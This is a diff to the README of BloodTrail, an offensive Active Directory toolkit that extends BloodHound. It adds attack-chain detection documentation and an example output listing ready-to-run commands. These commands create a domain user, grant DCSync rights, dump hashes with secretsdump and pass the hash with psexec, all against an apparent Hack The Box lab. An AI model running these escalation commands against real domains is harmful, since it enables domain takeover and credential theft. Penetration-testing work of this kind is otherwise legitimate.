@@ -12,6 +12,7 @@ Active Directory attack path discovery and exploitation toolkit. Extends BloodHo
 | Query Library | 63+ Cypher queries for attack path discovery |
 | Pwned Tracking | Track compromised users and access paths in Neo4j |
 | Command Generation | Auto-suggest exploitation commands for discovered paths |
+| **Attack Chain Detection** | Auto-detect multi-step escalation paths (Exchange DCSync, GenericAll, etc.) |
 | Password Spraying | Policy-aware spraying with lockout protection |
 
 ## Quick Start
@@ -84,6 +85,37 @@ crack bloodtrail --run-all                   # Run all, generate report
 crack bloodtrail --install-queries           # Install to BloodHound GUI
 ```
 
+### Attack Chain Detection
+
+BloodTrail automatically detects multi-step privilege escalation paths from BloodHound data and generates ready-to-run commands.
+
+```bash
+# Detect chains for a specific user
+crack bloodtrail --chains svc-alfresco -d htb.local --dc-ip 10.10.10.161
+
+# Chains are also included in the full report
+crack bloodtrail --run-all
+```
+
+**Detected Chain Types:**
+
+| Chain | Description |
+|-------|-------------|
+| Exchange WriteDACL → DCSync | Account Operators → Exchange Windows Permissions → DCSync |
+| GenericAll → Password Reset | Reset user password via GenericAll privilege |
+| ForceChangePassword | Change password without knowing current |
+| Backup Operators → NTDS.dit | Extract hashes via backup privilege |
+
+**Example Output:**
+```
+[DETECTED] Exchange WriteDACL → DCSync
+  1. net user bloodtrail 'B1oodTr@il123!' /add /domain
+  2. net group "Exchange Windows Permissions" bloodtrail /add
+  3. Add-ObjectACL -PrincipalIdentity bloodtrail -Rights DCSync
+  4. impacket-secretsdump HTB.LOCAL/bloodtrail:'B1oodTr@il123!'@10.10.10.161
+  5. impacket-psexec HTB.LOCAL/Administrator@10.10.10.161 -hashes <HASH>
+```
+
 ### Pwned User Tracking
 
 ```bash
@@ -130,8 +162,12 @@ crack bloodtrail --auto-spray --execute      # Execute with confirmation
 Default: `bolt://localhost:7687`
 
 ```bash
+# Environment variable (recommended)
+export NEO4J_PASSWORD='your_password'
+crack bloodtrail --run-all
+
 # CLI override
-crack bloodtrail --uri bolt://host:7687 --user neo4j --password secret
+crack bloodtrail --uri bolt://host:7687 --user neo4j --neo4j-password secret
 ```
 
 Config file (`~/.crack/config.json`):
@@ -163,8 +199,12 @@ crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice
 # 5. View attack paths from pwned user
 crack bloodtrail --pwned-user 'SVC-ALFRESCO@HTB.LOCAL'
 
-# 6. Get exploitation commands
-crack bloodtrail --post-exploit
+# 6. Run full report with attack chain detection
+crack bloodtrail --run-all --dc-ip 10.10.10.161
+# Look for [DETECTED] chains in output
+
+# 7. Or detect chains for specific user
+crack bloodtrail --chains svc-alfresco -d htb.local --dc-ip 10.10.10.161
 ```
 
 ## Output Files
@@ -227,9 +267,16 @@ bloodtrail/
 │   ├── privilege_escalation.json
 │   └── attack_chains.json
 │
+├── recommendation/           # Attack path analysis
+│   ├── attack_chains.py     # Dynamic chain detection
+│   ├── bloodhound_analyzer.py # BloodHound query analysis
+│   ├── models.py            # Finding, Recommendation models
+│   ├── triggers.py          # Pattern matching rules
+│   └── engine.py            # Recommendation state machine
+│
 ├── main.py                   # BHEnhancer core
 ├── query_runner.py           # Cypher execution
-├── report_generator.py       # Report generation
+├── report_generator.py       # Report generation + chain detection
 ├── pwned_tracker.py          # Pwned user tracking
 ├── command_suggester.py      # Command generation
 └── creds_pipeline.py         # Credential pipeline
